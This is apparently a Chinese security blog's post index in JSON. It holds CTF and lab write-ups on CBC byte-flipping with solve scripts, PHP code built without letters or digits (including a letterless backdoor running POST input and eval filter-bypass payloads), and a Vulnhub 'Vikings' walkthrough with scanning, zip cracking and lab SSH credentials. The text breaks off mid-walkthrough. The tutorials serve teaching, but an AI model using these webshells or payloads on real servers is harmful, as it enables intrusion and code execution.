[{"title":"cbc字节反转攻击入门","url":"/2021/12/01/cbc/","content":"1.    基本概念1.1    CBC模式1976年，IBM发明了密码分组链接（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。\n加密过程：\n\nPlaintext：明文数据；\nInitialzation Vector（IV）：初始向量；\nKey：分组加密使用的密钥；\nCiphertext：密文数据；\n\nCiphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块\n\n加密步骤：\n\n首先将明文分成长度相同（一般为8或16字节）的n组，其中最后一组位数不足的进行Padding操作（填充规则是PKCS #5或PKCS #7）；\n生成一个随机的初始向量（IV）和一个密钥（Key）；\n将IV与第一组明文进行XOR，将XOR后的结果使用Key进行加密得到第一组密文；\n将第一组密文和第二组明文进行XOR，将XOR后的结果使用Key进行加密得到第二组密文；\n依次类推，将第n-1组密文和第n组明文进行XOR，将XOR后的结果使用Key进行加密得到第n组密文；\n将IV和得到的所有分组密文拼接到一起，得到最终的密文；\n\n解密过程：\nPlaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块\n\n解密步骤：\n\n首先从密文中提取出初始向量（IV），然后将密文分成n组（一般为8或16字节一组）；\n使用密钥（Key）对第一组密文进行解密，得到解密的中间值我们称为Intermediary Value；\n使用IV与第一组Intermediary Value进行XOR，得到第一组明文；\n使用Key对第n组密文进行解密，得到第n组Intermediary Value；\n使用第n-1组密文与第n组Intermediary Value进行XOR，得到第n组明文；\n将所有分组明文拼接到一起，得到最终的明文；0\n\n注意：Ciphertext-N-1（密文-N-1）是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变Ciphertext-N-1（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！\n\nhttps://en.wikipedia.org/wiki/Block_cipher_mode_of_operation\n1.2 异或异或（XOR）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。其运算法则为：\na⊕b = (¬a ∧ b) ∨ (a ∧¬b)\n如果a、b两个值不相同，则异或结果为1。如果a、b两个值相同，异或结果为0。\n在计算机中，存储的数据是以二进制的格式存入的，把两段二进制数字进行异或运算的话，相同的得0，不同的得1。字符在计算机中有对应的ASCII码值，对字符进行异或运算就是将两串字符对应的ASCII码值进行异或。\n异或运算具有可逆性，a xor b = c 等价于 b xor c = a 等价于 a xor c = b。\n2.    simple demo跟着L1NK3R师傅的博客摸索一遍\n下面是一段明文序列：\na:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#x27;Hello sdsdsd!&#x27;&quot;;&#125;\n\n目标：将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：\nBlock 1:\ta:2:&#123;s:4:&quot;name&quot;;Block 2:\ts:6:&quot;sdsdsd&quot;;s:8Block 3:\t:&quot;greeting&quot;;s:20Block 4:\t:&quot;echo &#x27;Hello sdBlock 5:\tsdsd!&#x27;&quot;;&#125;\n\n因此,根据第一节末我们讲的，\n目标字符位于块2，这意味着我们需要改变块一的密文来改变第二块的明文。\n你在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。\n因此我们要改变在第一个密文块当中，偏移量是2的字节。正如你在下面的代码当中看到的，在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。\n&lt;?phpdefine(&#x27;MY_AES_KEY&#x27;, &quot;abcdef0123456789&quot;);function aes($data, $encrypt) &#123;    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &#x27;&#x27;, MCRYPT_MODE_CBC, &#x27;&#x27;);    $iv = &quot;1234567891234567&quot;;    mcrypt_generic_init($aes, MY_AES_KEY, $iv);    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);&#125;define(&#x27;MY_MAC_LEN&#x27;, 40);function encrypt($data) &#123;    return aes($data, true);&#125;function decrypt($data) &#123;    $data = rtrim(aes($data, false), &quot;\\0&quot;);    return $data;&#125;$v = &#x27;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo \\&#x27;Hello sdsdsd!\\&#x27;&quot;;&#125;&#x27;;echo $v;echo &quot;\\n&quot;;$enc = @encrypt($v);$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));$b = @decrypt($enc);echo $b;\n\noutput:\na:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#x27;Hello sdsdsd!&#x27;&quot;;&#125;\u000e�1��îqv��\u0010C�fs:7:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#x27;Hello sdsdsd!&#x27;&quot;;&#125;\n\n可以看到，6已经被我们变为了7\n原理如下：\nA = Decrypt(Ciphertext)与B = Ciphertext-N-1异或后最终得到C = 6。等价于：\nC = A XOR B\n\n所以，我们唯一不知道的值就是A（注：对于B，C来说）（block cipher decryption）;借由XOR，我们可以很轻易地得到A的值：\nA = B XOR C\n\nA XOR B XOR C等于0\nord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;)B\t\t^\t\tC\t\t^\t\t目标值 \n\n如此计算出A，然后就可以根据原来的逻辑以A得到C，也就是我们想要修改的值\n我们控制A为我们计算出来的payload即可\n3.例题iscc2018 《Only admin can see flag》\n&lt;?phpinclude &#x27;sqlwaf.php&#x27;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv()&#123;    $iv=&#x27;&#x27;;    for($i=0;$i&lt;16;$i++)&#123;        $iv.=chr(rand(1,255));    &#125;    return $iv;&#125;function login($info)&#123;    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#x27;username&#x27;] = $info[&#x27;username&#x27;];    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function show_homepage()&#123;    if ($_SESSION[&quot;username&quot;]===&#x27;admin&#x27;)&#123;        echo &#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;;        echo &#x27;&lt;p&gt;Flag is *************&lt;/p&gt;&#x27;;    &#125;else&#123;        echo &#x27;&lt;p&gt;hello &#x27;.$_SESSION[&#x27;username&#x27;].&#x27;&lt;/p&gt;&#x27;;        echo &#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;;    &#125;    echo &#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;;    die();&#125;function check_login()&#123;    if(isset($_COOKIE[&#x27;cipher&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;iv&#x27;]))&#123;        $cipher = base64_decode($_COOKIE[&#x27;cipher&#x27;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#x27;&quot;.base64_encode($plain).&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#x27;username&#x27;] = $info[&#x27;username&#x27;];        &#125;else&#123;            die(&quot;ERROR!&quot;);        &#125;    &#125;&#125;if (isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;])) &#123;  $username=waf((string)$_POST[&#x27;username&#x27;]);  $password=waf((string)$_POST[&#x27;password&#x27;]);  if($username === &#x27;admin&#x27;)&#123;        exit(&#x27;&lt;p&gt;You are not real admin!&lt;/p&gt;&#x27;);    &#125;else&#123;        $info = array(&#x27;username&#x27;=&gt;$username,&#x27;password&#x27;=&gt;$password);        login($info);        show_homepage();    &#125;&#125;else&#123;  if(isset($_SESSION[&quot;username&quot;]))&#123;        check_login();        show_homepage();    &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#x27;username&#x27; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#x27;password&#x27; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\n分析：\nshow_homepage函数：\n    if ($_SESSION[&quot;username&quot;]===&#x27;admin&#x27;)&#123;        echo &#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;;        echo &#x27;&lt;p&gt;Flag is *************&lt;/p&gt;&#x27;;.....\n\n要让$_SESSION[“username”]===’admin’成立，才能返回flag\n但是如果我们直接在输入框里输入admin，她又是不允许的\nif($username === &#x27;admin&#x27;)&#123;        exit(&#x27;&lt;p&gt;You are not real admin!&lt;/p&gt;&#x27;);\n\n\n\n因此我们可以通过这里的反序列化来控制$_SESSION[“username”]===’admin’\n回到check_login函数\nfunction check_login()&#123;    if(isset($_COOKIE[&#x27;cipher&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;iv&#x27;]))&#123;        $cipher = base64_decode($_COOKIE[&#x27;cipher&#x27;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#x27;&quot;.base64_encode($plain).&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#x27;username&#x27;] = $info[&#x27;username&#x27;];        &#125;else&#123;            die(&quot;ERROR!&quot;);        &#125;    &#125;&#125;\n\n\n\n所以要求我们输入的不是admin，但经过AES加密后变成了admin\n解题：\n&lt;?php$info = array(&#x27;username&#x27;=&gt;&#x27;admi0&#x27;,&#x27;password&#x27;=&gt;&#x27;123456&#x27;);echo serialize($info)?&gt;\n\n用户名相同长度，但是不是admin\na:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admi0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;\n\n\n\n分块,16字节一分\na:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admi0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;\n\n所要控制的0在第二块，偏移13\n因此如果我们要攻击，代码段应该是这样：\n$enc[2] = chr(ord($enc[13]) ^ ord(&quot;2&quot;) ^ ord (&quot;n&quot;));\n\n但是这里密文值发生了改变，解密后可能会出现上面小demo中的乱码导致反序列化失败\n用admi0/123456登录\n拿到cookie中cipher的值，并用脚本进行字符翻转\nimport base64from urllib import unquotefrom urllib import quote_pluscipher = &#x27;9AOOYlmVvT4xmjViSqORmkZT%2Bxm2mJf0tsuHd%2BUcf1xrghHyXp8FRoQjkE%2FR4dJu8U8DJfcHcHEGJI2ntOYxHw%3D%3D&#x27;cipher = unquote(cipher)cipher_de = base64.b64decode(cipher)ch = chr(ord(cipher_de[13]) ^ ord(&#x27;0&#x27;) ^ ord(&#x27;n&#x27;))cipher_de=cipher_de[0:13]+ch+cipher_de[14::]rs = base64.b64encode(cipher_de)print quote_plus(rs)\n\n此时页面回显\nww0E9uos3vF/p7Ef76SZNW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==Ã.öê,Þñ.§±.ï¤.5me&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;&#125;\n\n可以看到，目标字符串已经翻转成功，但是第一段的密文解密出来成了乱码\n但是我们把block1的密文改了，接下来考虑怎么把block1给他恢复，使得明文可以被反序列化\n# -*- coding:utf-8 -*-import base64from urllib import unquotefrom urllib import quote_plusmingwen_de=&#x27;8KV6FFinwp+pUFrattXjQ21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ==&#x27;#base64_decode(&#x27;这里面的&#x27;) can&#x27;t unserializemingwen = base64.b64decode(mingwen_de)print mingweniv = &#x27;b6bpYwyjk7rZs4sScY8p4A%3D%3D&#x27;#此时cookie里的iviv = unquote(iv)iv_de = base64.b64decode(iv)new = &#x27;a:2:&#123;s:8:&quot;userna&#x27;for i in range(16):    iv_de = iv_de[:i] + chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i])) + iv_de[i+1:]print(base64.b64encode(iv_de))#用这个结果把原来的iv换掉\n\n根据cbc解码时的规则\nC1 ^ IV =&gt; B1\n所以我们只要求出正确的IV就可以控制B1为我们想要的值，这和上面的翻转攻击有相似的地方\n\n参考资料：\nhttps://www.mi1k7ea.com/2020/09/17/%E6%B5%85%E6%9E%90CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E4%B8%8EPadding-Oracle-Attack/\nhttp://www.lmxspace.com/2018/05/07/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/\n","categories":["web"],"tags":["cbc"]},{"title":"Hello World","url":"/2021/11/29/hello-world/","content":"欢迎来到我的新博客。\n之前的博客全部关闭了，感觉看着有点羞耻。\n之后尽量在这里写一点自己总结或者发现的东西吧。\nimage Test\n利贺田\n"},{"title":"php无字母数字构造-入门级","url":"/2021/11/30/php%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%E5%85%A5%E9%97%A8/","content":"1    前置知识1.1    php中的正则匹配函数最常见的preg_grep()\npreg_grep(string $pattern, array $array, int $flags = 0): array|false\n返回给定数组array中与模式pattern 匹配的元素组成的数组\n其余的正则函数可以在https://www.runoob.com/php/php-pcre.html里学习\n1.2     正则匹配式正则表达式手册：https://tool.oschina.net/uploads/apidocs/jquery/regexp.html\nhttps://www.runoob.com/regexp/regexp-tutorial.html\n动态调试正则表达式的网站：https://regex101.com/\n中文在线调试：https://c.runoob.com/front-end/854/\n尝试阅读几个正则表达式：\n/^[a-z0-9_-]&#123;3,16&#125;$/\t\t用来过滤用户名/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/\t\t匹配ip地址/^[a-z\\d]+(\\.[a-z\\d]+)*@([\\da-z](-[\\da-z])?)+(\\.&#123;1,2&#125;[a-z]+)+$/电子邮箱\n\n1.3    php中的位运算在构造字符绕正则的时候，我们常用位运算符来帮助我们构造\nphp位运算符：https://blog.csdn.net/qq_28602957/article/details/52141431\n2    无字母数字构造2.1    无字母数字基础&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;  eval($_GET[&#x27;shell&#x27;]);&#125;\n\n\nphp5\n修饰符i，s：https://www.runoob.com/regexp/regexp-flags.html\n\n异或拼接：\n（来自p牛博客\n&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]);\n\n(很多不可打印字符，用url编码表示)\n异或:\n(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();\n\n这样可以phpinfo\n倘若过滤了引号：\n$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo\n\n%86%86%86%86^%d9%c1%c3%d2构造出_GET,php中可以这样构造参数,花括号在数组中可以索引：\n$_GET&#123;2&#125;\n\n\n\n一个非数字字母的php后门（使用异或）：\n// demo1.php&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST     $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;\n\n拼接_POST:\n$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);\n\n更短的字符：\n&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot; //_GET&quot;#./|&#123;&quot;^&quot;|~`//&quot; //_POST\n\n\n\n或：\n(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();\n\n这样可以phpinfo\n(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);\n\nsystem(‘whoami’); 可以rce\n取反：\n(~%8F%97%8F%96%91%99%90)();\n\n可phpinfo\nutf-8下取中文字符取反：\nUTF-8编码的某个汉字，并将其中某个字符取出来，比如’和’{2}的结果是”\\x8c”，其取反即为字母s\n&lt;?php$_=&quot;和&quot;;print(~($_&#123;2&#125;));print(~&quot;\\x8c&quot;);?&gt;\n\n脚本生成：\n&gt;&gt;&gt; def get(shell):...     hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))...     print(hexbit)...&gt;&gt;&gt; get(&#x27;phpinfo&#x27;)0x8f0x970x8f0x960x910x990x90\n\n\n\n自增：\n‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。\n文档：http://php.net/manual/zh/language.operators.increment.php\n如何拿到一个值为字符串’a’的变量呢？\n数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：\n&lt;?phpecho &#x27;&#x27;.[];//Array\n\n构造：ASSERT($_POST[_]);\n&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);\n\n\n\n//测试发现7.0.12以上版本不可使用//使用时需要url编码下$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);固定格式 构造出来的 assert($_POST[_]);然后post传入   _=phpinfo();\n\n\n\n不用数字构造数字：\necho (&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);//2echo true+true;//2\n\n或者：\n&lt;?php$_++;print($_); // 1?&gt;php中未定义的变量默认值为null，nullfalse0\n\n\n\n2.2    长度限制&lt;?phpif(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;        die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;        die(&quot;NO.&quot;);    &#125;    eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\nphp7:\nPHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。\n(~%8F%97%8F%96%91%99%90)();\n\n\n\nphp5:\n上传临时文件：\nimport requestsurl=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;files=&#123;&#x27;file&#x27;:&#x27;cat f*&#x27;&#125;response=requests.post(url,files=files)html = response.textprint(html)\n\n具体原理看p神文章可了解详细\nglob通配符：https://man7.org/linux/man-pages/man7/glob.7.html\n2.3    过滤下划线&lt;?phpinclude &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;50)&#123;        die(&quot;Too Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code))&#123;        die(&quot;Not Allowed.&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;\n\n\n\n异或：\n?code=(&#x27;$&#x27;).(&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;).([&#x27;+&#x27;])&amp;+=getFlag();\n\n这样是错误的，因为eval只能解析一遍代码，而此时中间的拼接就会成为第一遍解析的运算\n正确的payload为：\n?code=$&#123;&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;&#125;[&#x27;+&#x27;]();&amp;+=getFlag\n\n这里利用了**${}**中的代码是可以执行的特点，其实也就是可变变量。\n示例：\n&lt;?php    $a = &#x27;hello&#x27;;    $$a = &#x27;world&#x27;;    echo &quot;$a $&#123;$a&#125;&quot;;?&gt;        &gt;&gt;hello world\n\n\n\n取反：\n?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag其中24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B = $&#123;~&quot;\\xa0\\xb8\\xba\\xab&quot;&#125; = $_GET~在&#123;&#125;中执行了取反操作\n\n\n\n2.4    过滤$字符&lt;?php include &#x27;flag.php&#x27;;if(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;    die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))    &#123;        die(&quot;NO.&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;//$hint=&quot;php function getFlag() to get flag&quot;;?&gt;\n\npayload:\ncode=?&gt;&lt;?=`/???/??? ????.???`?&gt;/???/???通配``/bin/cat，???.???通配flag.php`\n\n\n\n\n\n参考：\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\nhttps://ca01h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/\nhttps://blog.csdn.net/miuzzx/article/details/109143413\n","categories":["web"],"tags":["php"]},{"title":"Viking","url":"/2021/12/01/Viking/","content":"靶机介绍本靶机解密风格很重，比较像ctf\n靶机地址：https://download.vulnhub.com/vikings/Vikings.ova\n目标：拿到2个flag\n难度：低\n信息搜集arp-scan -l\n\n扫描网段内所有主机，确认目标靶机地址\nnmap -p- 192.168.56.112\n\n对靶机进行全端口扫描，扫出来了22和80端口\nnmap -p22,80 -A 192.168.56.112\n\n对两个端口的服务进行扫描\nPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 59:d4:c0:fd:62:45:97:83:15:c0:15:b2:ac:25:60:99 (RSA)|   256 7e:37:f0:11:63:80:15:a3:d3:9d:43:c6:09:be:fb:da (ECDSA)|_  256 52:e9:4f:71:bc:14:dc:00:34:f2:a7:b3:58:b5:0d:ce (ED25519)80/tcp open  http    Apache httpd 2.4.29| http-ls: Volume /| SIZE  TIME              FILENAME| -     2020-10-29 21:07  site/|_|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Index of /\n\n\n\n路径爆破gobuster这个工具已经赢dirsearch太多\ngobuster dir -r -u http://192.168.56.112/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php,html -o dir-common.log\n\n扫描发现：/war.txt              (Status: 200) [Size: 13]  \n提示我们转到 http://192.168.56.112/site/war-is-over/\n这个页面，返回一串类似base64的长数据，我们用kali保存数据到本地\ncurl http://192.168.56.112/site/war-is-over/|base64 -d &gt;output\n\n\n\nfile查看文件类型\n┌──(root💀kali)-[~]└─# file output                                                                                                                         output: Zip archive data, at least v5.1 to extract\n\n但是解压需要密码，此处我们不知道密码，看看能不能爆破\n爆破压缩包密码工具：john\nzip2john output.zip &gt;&gt; passwd.txtjohn passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt \n\n很快爆破出了密码：ragnarok123\n压缩包里是一张图片，根据经验应该是隐写\n图片隐写比较低级的隐写，binwalk分离\n//FamousBoatbuilder_floki@vikings                                     //f@m0usboatbuilde7 \n\nssh成功登录为floki用户\nuid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)\n\n\n\n两个可疑的文本，可能对接下来的解题有帮助\nfloki@vikings:~$ cat readme.txt _______________________________________________________________________Floki-Creation____________________________________________________________________________________________________I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don&#x27;t know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. I need to create this `boat` to find Ragnarfloki@vikings:~$ cat boat#Printable chars are your ally.#num = 29th prime-number.collatz-conjecture(num)\n\n\n\n查看/etc/passwd\nfloki:x:1000:1000:floki:/home/floki:/bin/bashragnar:x:1001:1001::/home/ragnar:/bin/sh\n\n\n\n提权用户组108(lxd)给我们可以提权的机会，参考：https://www.freebuf.com/articles/system/216803.html\n但是这里依照靶机的意思我们继续解谜\n==》I need to create this boat to find Ragnar\nboat是我们提权到Ragnar用户的关键\nboat:\n#Printable chars are your ally.#num = 29th 